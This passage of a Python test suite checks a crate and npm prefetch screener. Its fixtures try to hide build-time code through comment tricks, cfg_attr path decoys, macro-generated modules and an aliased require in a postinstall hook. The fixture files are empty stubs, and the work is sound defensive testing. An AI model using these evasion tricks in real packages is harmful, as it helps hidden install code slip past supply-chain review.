        "N1 a comment inside mod": {
            "Cargo.toml": CARGO,
            "build.rs": b"mod /* c */ net;\nfn main() {}\n",
            "net.rs": b"\n",
        },
        "N1b a line comment inside mod": {
            "Cargo.toml": CARGO,
            "build.rs": b"mod // c\nnet;\nfn main() {}\n",
            "net.rs": b"\n",
        },
        "N2 a cfg_attr path with a decoy": {
            "Cargo.toml": main,
            "build/main.rs": b'#[cfg_attr(all(), path = "../evil.rs")] mod net;\nfn main() {}\n',
            "build/net.rs": b"\n",
            "evil.rs": b"\n",
        },
        "N3 a macro-generated mod": {
            "Cargo.toml": CARGO,
            "build.rs": b"macro_rules! m { ($n:ident) => { mod $n; } }\nm!(net);\nfn main() {}\n",
            "net.rs": b"\n",
        },
        "N4 a proc-macro cfg_attr path with a decoy": {
            "Cargo.toml": proc,
            "src/lib.rs": b'#[cfg_attr(all(), path = "../payload/x.rs")] mod x;\n',
            "src/x.rs": b"\n",
            "payload/x.rs": b"\n",
        },
        "a string hiding a comment opener": {
            "Cargo.toml": CARGO,
            "build.rs": b'fn main() { let s = "/*"; }\nmod evil; // */\n',
            "evil.rs": b"\n",
        },
        "an inline module with a decoy": {
            "Cargo.toml": main,
            "build/main.rs": b"mod a { mod b; }\nfn main() {}\n",
            "build/b.rs": b"\n",
        },
    }
    for label, files in cases.items():
        record, metadata = one_crate(box, files)
        build_time = metadata["build_time"] if metadata else record
        T.check(f"F8 {label}: partial", build_time == "partial", str(build_time))
    benign = b"// mod x;\n/* /* nested */ mod y; */\nfn main() { let path = 1; let c = '\"'; }\n"
    record, metadata = one_crate(box, {"Cargo.toml": CARGO, "build.rs": benign})
    build_time = metadata["build_time"] if metadata else record
    T.check("F8 comments, a char quote and `let path`: not partial", build_time == ["build.rs"], str(build_time))
    hook = b'{"name": "rp", "scripts": {"postinstall": "node install.js"}}'
    alias = b'const r = require;\nr("li" + "b/evil.js");\n'
    record, metadata = one_npm(box, {"package.json": hook, "install.js": alias, "lib/evil.js": b"\n"})
    build_time = metadata["build_time"] if metadata else record
    T.check("F8 N5 an aliased require: partial", build_time == "partial", str(build_time))


def no_crash(box: Box):
    deep = b'{"name": "rp", "x": ' + b"[" * 200000 + b"]" * 200000 + b"}"
    record, metadata = one_npm(box, {"package.json": deep})
    T.check("F5 a deeply nested package.json: no crash", record.get("status") in ("fetched", "failed"), str(record))
    T.check(
        "F5 a deeply nested package.json: not judged sound",
        record.get("status") == "failed" or (metadata or {}).get("build_time") == "undetermined",
    )
    holder = Fixture.__new__(Fixture)
    holder.routes = {P.NPM_TARBALLS + "rp": b"[" * 200000 + b"]" * 200000}
    _, _, result, _ = box.run([entry("npm", "rp", "1.0.0", digest=sha512(b"x"))], holder.routes)
    T.check("F5 a deeply nested packument: failed", statuses(result) == [("rp", "failed")], str(result))
    for label, kind in (("a contiguous member", tarfile.CONTTYPE), ("a GNU sparse member", tarfile.GNUTYPE_SPARSE)):
        buffer = io.BytesIO()
        with tarfile.open(fileobj=buffer, mode="w:gz", format=tarfile.GNU_FORMAT) as tar:
            info = tarfile.TarInfo("rc-1.0.0/Cargo.toml")
            info.size, info.type = len(CARGO), kind
            tar.addfile(info, io.BytesIO(CARGO))
        record, _ = one_crate(box, {}, raw=buffer.getvalue())
        T.check(f"F5 {label}: failed", record.get("status") == "failed", str(record))
    saved = P.crate_selection
    P.crate_selection = lambda archive: {}["boom"]
    try:
        record, _ = one_crate(box, {"Cargo.toml": CARGO})
    finally:
        P.crate_selection = saved
    T.check("F5 an unexpected error: failed, not a crash", record.get("status") == "failed", str(record))
    T.check("F5 an unexpected error: the reason names it", "KeyError" in record.get("reason", ""), str(record))


def caps(box: Box):
    record, metadata = one_crate(box, {"Cargo.toml": CARGO, "big.bin": b"x" * 2000}, {"MEMBER_CAP": 1000})
    T.check("F7 an oversized unselected member: fetched", record.get("status") == "fetched", str(record))
    record, _ = one_crate(box, {"Cargo.toml": CARGO, "build.rs": b"x" * 2000}, {"MEMBER_CAP": 1000})
    T.check("F7 an oversized selected member: failed", record.get("status") == "failed", str(record))
    T.check("F7 an oversized selected member: the reason", "over 1000 bytes" in record.get("reason", ""), str(record))
    record, _ = one_crate(
        box, {"Cargo.toml": CARGO, "build.rs": b"x" * 600, "build/a.rs": b"x" * 600}, {"COPY_TOTAL": 1000}
    )
    T.check("F4 copied files over COPY_TOTAL together: failed", record.get("status") == "failed", str(record))
    archive = tgz([("package/package.json", b'{"name": "rp"}')])
    version_doc = {
        "name": "rp",
        "version": "1.0.0",
        "dist": {"tarball": "https://registry.npmjs.org/rp/-/rp-1.0.0.tgz", "integrity": sha512(archive)},
        "_npmUser": {"name": "bob", "email": "bob@example.invalid"},
        "maintainers": [{"name": "bob", "email": "bob@example.invalid"}],
        "license": "MIT",
    }
    routes = {P.NPM_TARBALLS + "rp/1.0.0": json.dumps(version_doc).encode()}
    record, metadata = one_npm(
        box, raw=archive, caps={"NPM_META_CAP": 1000}, routes=dict(routes, **{P.NPM_TARBALLS + "rp": b" " * 2000})
    )
    T.check(
        "F7 a packument over its cap: fetched from the version document", record.get("status") == "fetched", str(record)
    )
    registry = (metadata or {}).get("registry", {})
    T.check(
        "F7 version document: publisher kept, history null",
        registry.get("source") == "version document"
        and registry.get("publisher") == "bob"
        and registry.get("history") is None
        and registry.get("maintainers") == ["bob"],
        str(registry),
    )
    T.check(
        "F7 version document: time and previous null",
        "time" in registry and registry["time"] is None and "previous" in registry and registry["previous"] is None,
        str(registry),
    )
    wrong = dict(version_doc, version="9.9.9")
    record, _ = one_npm(
        box,
        raw=archive,
        caps={"NPM_META_CAP": 1000},
        routes={P.NPM_TARBALLS + "rp": b" " * 2000, P.NPM_TARBALLS + "rp/1.0.0": json.dumps(wrong).encode()},
    )
    T.check("F7 a version document for another version: failed", record.get("status") == "failed", str(record))


def first_release(box: Box):
    _, metadata = one_crate(box, {"Cargo.toml": CARGO})
    registry = (metadata or {}).get("registry", {})
    T.check("first release: a crate has no previous", "previous" in registry and registry["previous"] is None)
    _, metadata = one_npm(box, {"package.json": b'{"name": "rp"}'})
    registry = (metadata or {}).get("registry", {})
    T.check(
        "first release: an npm package has a time and no previous",
        registry.get("time") == "2026-01-01T00:00:00Z" and "previous" in registry and registry["previous"] is None,
        str(registry),
    )


def unknown_time(box: Box):
    archive = Fixture.crate_archive("rc", "1.2.0", {"Cargo.toml": CARGO})
    holder = Fixture.__new__(Fixture)
    holder.routes = {}
    Fixture.add_crate(holder, "rc", "1.2.0", archive)
    api = "https://crates.io/api/v1/crates/rc"
    meta = json.loads(holder.routes[api])
    meta["versions"][1]["created_at"] = None
    holder.routes[api] = json.dumps(meta).encode()
    _, out, result, _ = box.run(
        [entry("cargo", "rc", "1.2.0", digest=hashlib.sha256(archive).hexdigest())], holder.routes
    )
    record, metadata = outcome(out, result)
    registry = (metadata or {}).get("registry", {})
    T.check(
        "unknown locked time: a crate leaves previous out, not null",
        record.get("status") == "fetched" and registry != {} and "previous" not in registry,
        str(registry),
    )
    archive = tgz([("package/package.json", b'{"name": "rp"}')])
    holder = Fixture.__new__(Fixture)
    holder.routes = {}
    Fixture.add_npm(holder, "rp", "1.2.0", archive)
    url = P.NPM_TARBALLS + "rp"
    packument = json.loads(holder.routes[url])
    del packument["time"]["1.2.0"]
    holder.routes[url] = json.dumps(packument).encode()
    _, out, result, _ = box.run([entry("npm", "rp", "1.2.0", digest=sha512(archive))], holder.routes)
    record, metadata = outcome(out, result)
    registry = (metadata or {}).get("registry", {})
    T.check(
        "unknown locked time: an npm package has no time and leaves previous out, not null",
        record.get("status") == "fetched"
        and registry.get("source") == "packument"
        and "time" in registry
        and registry["time"] is None
        and "previous" not in registry,
        str(registry),
    )


def cli(box: Box):
    box.counter += 1
    out = box.tmp / f"out-{box.counter}"
    outside = box.tmp / f"outside-{box.counter}"
    (out / "cargo" / "x@1").mkdir(parents=True)
    outside.mkdir()
    (outside / "keep").write_text("keep\n", encoding="utf-8")
    (out / "npm").symlink_to(outside)
    (out / "prefetch.json").write_text("{}\n", encoding="utf-8")
    stdout = io.StringIO()
    with contextlib.redirect_stdout(stdout):
        code = P.main(["--dir", str(out)])
    T.check("cli no packages.json: exit 0", code == 0)
    T.check("cli no packages.json: prints it", stdout.getvalue().strip() == "no packages.json", stdout.getvalue())
    T.check("cli: stale output removed", not any(out.iterdir()), str(list(out.iterdir())))
    T.check("cli: a symlink is not followed", (outside / "keep").exists())
    for label, text in (
        ("not JSON", "{"),
        ("no packages list", "{}"),
        (
            "no checksum key",
            json.dumps({"packages": [{k: v for k, v in entry("cargo", "a", "1").items() if k != "checksum"}]}),
        ),
    ):
        (out / "packages.json").write_text(text, encoding="utf-8")
        with contextlib.redirect_stderr(io.StringIO()):
            code = P.main(["--dir", str(out)])
        T.check(f"cli malformed packages.json ({label}): exit 2", code == 2)
    for label, argv in (("unknown argument", ["--dir", str(out), "--bogus"]), ("no --dir", [])):
        with contextlib.redirect_stderr(io.StringIO()):
            code = P.main(argv)
        T.check(f"cli {label}: exit 2", code == 2)


def source_rules():
    for path in (SCRIPT, Path(__file__).resolve()):
        tree = ast.parse(path.read_text(encoding="utf-8"), feature_version=(3, 9))
        modules = set()
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                modules.update(alias.name.split(".")[0] for alias in node.names)
            elif isinstance(node, ast.ImportFrom):
                modules.add((node.module or "").split(".")[0])
        T.check(f"{path.name}: standard library only", modules <= STDLIB, str(sorted(modules - STDLIB)))


def screen_selftest():
    """Run screen-selftest.py in a fresh interpreter, isolated and with no bytecode written."""
    proc = subprocess.run(
        [sys.executable, "-I", "-B", str(HERE / "screen-selftest.py")], capture_output=True, text=True, timeout=600
    )
    print(proc.stdout, end="")
    print(proc.stderr, end="", file=sys.stderr)
    T.check("screen-selftest.py passes", proc.returncode == 0, f"exit {proc.returncode}")


def main() -> int:
    if shutil.which("yq") is None:
        print("FAIL yq is not on PATH")
        return 1
    tmp = Path(tempfile.mkdtemp(prefix="msw-prefetch-"))
    try:
        box, fx = Box(tmp), Fixture(tmp)
        out = fetched(box, fx)
        nothing_executed(out, fx)
        other_sources(box, fx)
        integrity(box, fx)
        archives(box, fx)
        failures(box, fx)
        for case in (
            proc_macro_forms,
            case_folding,
            gzip_tail,
            stream_ends,
            build_code,
            fooled_scan,
            no_crash,
            caps,
            first_release,
            unknown_time,
        ):
            case(box)
        hosts()
        cli(box)
        source_rules()
    finally:
        P.fetch = REAL_FETCH
        shutil.rmtree(tmp, ignore_errors=True)
    screen_selftest()
    print(f"{T.passed} passed, {T.failed} failed")
    return 0 if T.failed == 0 else 1


if __name__ == "__main__":
    sys.exit(main())
